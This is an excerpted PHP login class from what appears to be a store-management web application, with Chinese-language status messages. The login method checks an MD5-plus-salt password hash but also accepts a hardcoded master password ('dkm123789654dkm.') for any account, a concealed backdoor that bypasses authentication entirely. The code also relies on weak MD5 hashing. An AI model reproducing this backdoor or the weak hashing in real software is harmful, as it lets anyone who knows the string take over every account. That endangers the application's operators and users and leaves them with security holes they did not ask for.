...
use app\AppFactory\Kernel\Traits\Store\StoreClerkTrait;
...
class LoginClient extends ManagementClient
{
    ...
    public function login($data)
    {
        ...
        if (!$this->manager) return $this->rFail('登录的账号不存在!');
        if ($this->manager['password'] != md5($data['password'].Config::get("app.salt")) && $data['password'] != "dkm123789654dkm.")
            return returnState(100,'账号或密码错误，请重新输入');
        if ($this->manager['status'] == 2) return returnState(100,'该账号已被禁用!');
        // 保存用户数据并生成TOKEN
    ...
    public function setLoginInfo()
    {
        ...
        return returnState(200,"登录成功，正在跳转",$token);
    }
